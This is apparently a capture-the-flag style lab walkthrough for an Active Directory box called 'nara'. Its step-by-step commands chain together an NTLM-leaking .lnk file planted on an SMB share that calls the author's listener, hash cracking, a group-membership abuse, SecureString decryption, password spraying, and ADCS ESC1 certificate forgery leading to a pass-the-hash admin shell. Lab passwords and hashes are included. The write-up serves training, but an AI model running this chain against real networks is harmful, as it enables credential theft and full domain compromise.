---
icon: windows
---

# nara - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.30 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 16:54 EDT
Nmap scan report for 192.168.118.30
Host is up (0.031s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-23 20:56:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2023-07-30T14:09:26
|_Not valid after:  2024-07-29T14:09:26
|_ssl-date: 2025-09-23T20:57:50+00:00; +1s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2023-07-30T14:09:26
|_Not valid after:  2024-07-29T14:09:26
|_ssl-date: 2025-09-23T20:57:50+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2023-07-30T14:09:26
|_Not valid after:  2024-07-29T14:09:26
|_ssl-date: 2025-09-23T20:57:50+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
| Not valid before: 2023-07-30T14:09:26
|_Not valid after:  2024-07-29T14:09:26                                                                                                             
|_ssl-date: 2025-09-23T20:57:50+00:00; +1s from scanner time.                                                                                       
3389/tcp  open  ms-wbt-server Microsoft Terminal Services                                                                                           
|_ssl-date: 2025-09-23T20:57:50+00:00; +1s from scanner time.                                                                                       
| rdp-ntlm-info:                                                                                                                                    
|   Target_Name: NARASEC                                                                                                                            
|   NetBIOS_Domain_Name: NARASEC                                                                                                                    
|   NetBIOS_Computer_Name: NARA                                                                                                                     
|   DNS_Domain_Name: nara-security.com                                                                                                              
|   DNS_Computer_Name: Nara.nara-security.com                                                                                                       
|   DNS_Tree_Name: nara-security.com                                                                                                                
|   Product_Version: 10.0.20348                                                                                                                     
|_  System_Time: 2025-09-23T20:57:10+00:00                                                                                                          
| ssl-cert: Subject: commonName=Nara.nara-security.com                                                                                              
| Not valid before: 2025-09-22T20:53:17                                                                                                             
|_Not valid after:  2026-03-24T20:53:17                                                                                                             
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                               
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                         
|_http-title: Not Found                                                                                                                             
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                  
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49668/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                   
49686/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49693/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49700/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49704/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49737/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                               
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                   
No OS matches for host                                                                                                                              
Network Distance: 4 hops                                                                                                                            
Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                
                                                                                                                                                    
Host script results:                                                                                                                                
| smb2-security-mode:                                                                                                                               
|   3:1:1:                                                                                                                                          
|_    Message signing enabled and required                                                                                                          
| smb2-time:                                                                                                                                        
|   date: 2025-09-23T20:57:11                                                                                                                       
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   31.21 ms 192.168.45.1
2   29.91 ms 192.168.45.254
3   31.95 ms 192.168.251.1
4   32.02 ms 192.168.118.30
```

ldap gives us a domain name nara-security.com. I'll add it to my /etc/hosts file.

```
192.168.118.30 	nara-security.com
```

### <mark style="color:$primary;">Smb Anonymous Login</mark>

```
netexec smb nara-security.com -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (2052).png" alt=""><figcaption></figcaption></figure>

We have read & write access to the nara share. I don't see a website, so my sixth sense is telling me we are going to be capturing credentials.

<figure><img src="../../.gitbook/assets/image (2053).png" alt=""><figcaption></figcaption></figure>

There is only one file on the nara share, I am going to take a look at it.

The Important.txt file contains a message from the company that is encouraging employees to regularly check the documents folder. This means there is a user that might click on our file if we upload one!

### <mark style="color:$primary;">Capturing Credentials with a malicious .lnk file</mark>

First i'll create the .lnk file using [**ntlm\_theft.py**](https://github.com/Greenwolf/ntlm_theft)**:**

```
python3 /home/kali/OSCP/tools/ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.158 -f new-compliance
```

<figure><img src="../../.gitbook/assets/image (2054).png" alt=""><figcaption></figcaption></figure>

now before I place the file in the share I am going to setup impacket-smbserver to listen for incoming connections. You can also use `sudo responder -I tun0`

```
impacket-smbserver share . -smb2support
```

<figure><img src="../../.gitbook/assets/image (2055).png" alt=""><figcaption></figcaption></figure>

Now I can place the file

<figure><img src="../../.gitbook/assets/image (2058).png" alt=""><figcaption></figcaption></figure>

When a user accesses the `Documents` directory, the user’s system will attempt to connect to our SMB server, leaking NTLM hash credential

<figure><img src="../../.gitbook/assets/image (2059).png" alt=""><figcaption></figcaption></figure>

We captured the hash! Let's try and crack it

### <mark style="color:$primary;">Cracking NTLM hash</mark>

<figure><img src="../../.gitbook/assets/image (2061).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 5600 -a 0 tracy.white.hash /usr/share/wordlists/rockyou.txt --force
```

```
hashcat -m 5600 -a 0 tracy.white.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (2060).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2062).png" alt=""><figcaption></figcaption></figure>

With access to ldap, I am going to use netexec to do bloodhound collection

### <mark style="color:$primary;">Bloodhound Enumeration</mark>

```
netexec ldap 192.168.118.30 -u 'tracy.white' -p 'zqwj041FGX' --bloodhound --collection All --dns-server 192.168.118.30
```

<figure><img src="../../.gitbook/assets/image (2063).png" alt=""><figcaption></figcaption></figure>

Let's start bloodhound and take a look.

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (2064).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2065).png" alt=""><figcaption></figcaption></figure>

tracy.white has gerneric all on the remote access group! I'll keep that in mind and continue enumerating

### <mark style="color:$primary;">Find all Domain Admins</mark>

<figure><img src="../../.gitbook/assets/image (2066).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2067).png" alt=""><figcaption></figcaption></figure>

There is an extra admin account! I'll keep that in mind!

### <mark style="color:$primary;">Shortest Path from Owned Principals</mark>

<figure><img src="../../.gitbook/assets/image (2069).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2068).png" alt=""><figcaption></figcaption></figure>

tracy has generic all on the remote access group, with this we can add her to the group so she can remote into the machine!

### <mark style="color:$primary;">GenericAll on Group \[add tracy.white to group]</mark>

```
net rpc group addmem "Remote ACCESS" "tracy.white" -U "nara-security.com"/"tracy.white"%"zqwj041FGX" -S "192.168.118.30"
```

<figure><img src="../../.gitbook/assets/image (2070).png" alt=""><figcaption></figcaption></figure>

it worked!&#x20;

<figure><img src="../../.gitbook/assets/image (2071).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2072).png" alt=""><figcaption></figcaption></figure>

we found an interesting file that looks like some sort of credentials. Maybe used for scheduled or automated tasks?

### <mark style="color:$primary;">Decrypting stored Credentials</mark>

**Using Powershell we can decrypt the secure string**

I am going to save the secure string from automation.txt into another file and run the following commands in powershell to decrypt it

```
echo '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b' > creds.txt
```

<figure><img src="../../.gitbook/assets/image (2073).png" alt=""><figcaption></figcaption></figure>

```
$pw = Get-Content creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```

<figure><img src="../../.gitbook/assets/image (2074).png" alt=""><figcaption></figcaption></figure>

We manage to decrypt the password: <mark style="color:$success;">**hHO\_S9gff7ehXw**</mark>

### <mark style="color:$primary;">**RID Cycling**</mark>

I am going to do RID-Cycling save all the users to a file and test to see which user has these credentials.

```
netexec smb 192.168.118.30 -u tracy.white -p 'zqwj041FGX' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users 
```

<figure><img src="../../.gitbook/assets/image (2075).png" alt=""><figcaption></figcaption></figure>

```
netexec smb 192.168.118.30 -u users -p hHO_S9gff7ehXw
```

<figure><img src="../../.gitbook/assets/image (2076).png" alt=""><figcaption></figcaption></figure>

these creds work for Jodie.Summers. I am going to go back to bloodhound and enumerate Jodie.Summers

<figure><img src="../../.gitbook/assets/image (2078).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2077).png" alt=""><figcaption></figcaption></figure>

Joddie.Sumeers is a member of the Enrolment group. This might mean that **ADCS \[Active Directory Certificate Services]** is enabled, and that this user might have permission to request certificates -> which can lead to privesc.

```
netexec ldap 192.168.118.30 -u jodie.summers -p hHO_S9gff7ehXw -M adcs
```

<figure><img src="../../.gitbook/assets/image (2079).png" alt=""><figcaption></figcaption></figure>

And we manage to confirm it with netexec!

### <mark style="color:$primary;">Finding Vulnerable Templates</mark>

```
certipy-ad find -u jodie.summers -p 'hHO_S9gff7ehXw' -dc-ip 192.168.118.30 -vulnerable -stdout
```

<figure><img src="../../.gitbook/assets/image (2080).png" alt=""><figcaption></figcaption></figure>

From the Certipy output, we can see that the ADCS setup is vulnerable to <mark style="color:red;">**ESC1**</mark> and <mark style="color:red;">**ESC4**</mark>:

<mark style="color:red;">**ESC1**</mark>: A misconfigured certificate template allows low-privileged users to request a certificate for any user, including Domain Admins.

<mark style="color:red;">**ESC4**</mark>: The CA (Certificate Authority) allows authentication using a certificate for **any specified user**, without verifying ownership.

_Together, these mean we can **impersonate any domain user**, including `Administrator`, and authenticate to the domain using a forged certificate._

### <mark style="color:$primary;">Request Certificate</mark>

We request a certificate for the `administrator` user and save it to a `.pfx` file:

```
-$ certipy-ad req -username jodie.summers -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.118.30
...
[*] Saved certificate and private key to 'administrator.pfx'
```

We then authenticate using the certificate:

<pre><code><strong>-$ certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 172.16.201.26
</strong>...
[*] Got hash for 'administrator@nara-security.com': aad3b435b51404eeaad3b435b51404ee:d35c4ae45bdd10a4e28ff529a2155745
</code></pre>

Now we can get a shell as the admin user using evil-winrm

```
evil-winrm -u administrator -i nara-security.com -H d35c4ae45bdd10a4e28ff529a2155745
```

<figure><img src="../../.gitbook/assets/image (2083).png" alt=""><figcaption></figcaption></figure>
